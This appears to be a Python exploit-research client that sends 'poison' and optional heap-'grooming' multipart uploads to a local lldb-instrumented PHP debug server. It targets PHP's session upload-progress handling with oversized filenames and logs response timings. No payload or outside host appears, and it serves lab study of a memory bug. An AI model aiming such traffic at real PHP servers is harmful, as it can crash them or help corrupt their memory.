#!/usr/bin/env python3
"""Stage-1/2 client: drives poison (+optional groom) traffic against the
lldb-instrumented debug php -S worker. Logs (tag, sid, http_status, latency_s,
body_bytes) CSV to stdout."""
import http.client, random, sys, time

HOST = "127.0.0.1"

def part(name, value, fname=None):
    b = "--BOUNDARYX\r\nContent-Disposition: form-data; name=\"%s\"" % name
    if fname is not None:
        b += "; filename=\"%s\"" % fname
    b += "\r\n\r\n"
    return b.encode() + value + b"\r\n"

END = b"--BOUNDARYX--\r\n"

def poison_body(sid, key, nfiles=20):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(nfiles):
        b += part("f%d" % i, b"X", "A" * 262144)
    return b + END

def perturb_body(rng, sid, tag):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", tag.encode())
    nf = rng.randint(1, 4)
    for i in range(nf):
        flen = rng.choice([4096, 8192, 16384, 32768])
        clen = rng.choice([0, 4096, 65536])
        b += part("p%d" % i, rng.randbytes(clen) if clen else b"", "P" * flen)
    return b + END

def post(port, body, timeout=60):
    c = http.client.HTTPConnection(HOST, port, timeout=timeout)
    t0 = time.perf_counter()
    c.request("POST", "/", body, {
        "Content-Type": "multipart/form-data; boundary=BOUNDARYX",
        "Content-Length": str(len(body))})
    r = c.getresponse()
    r.read()
    dt = time.perf_counter() - t0
    st = r.status
    c.close()
    return st, dt

def main():
    port, mode, n, seed = int(sys.argv[1]), sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
    rng = random.Random(seed)
    print("seq,tag,sid,http_status,latency_s,body_bytes")
    seq = 0
    for i in range(n):
        sid = "lm%05d" % i
        body = poison_body(sid, "k%d" % i)
        try:
            st, dt = post(port, body)
        except Exception as e:
            st, dt = -1, -1.0
        print("%d,poison,%s,%s,%.4f,%d" % (seq, sid, st, dt, len(body)), flush=True)
        seq += 1
        if mode == "groomed":
            for j in range(rng.randint(1, 3)):
                psid = "gp%05d_%d" % (i, j)
                pb = perturb_body(rng, psid, "g%d_%d" % (i, j))
                try:
                    st, dt = post(port, pb)
                except Exception:
                    st, dt = -1, -1.0
                print("%d,perturb,%s,%s,%.4f,%d" % (seq, psid, st, dt, len(pb)), flush=True)
                seq += 1

if __name__ == "__main__":
    main()
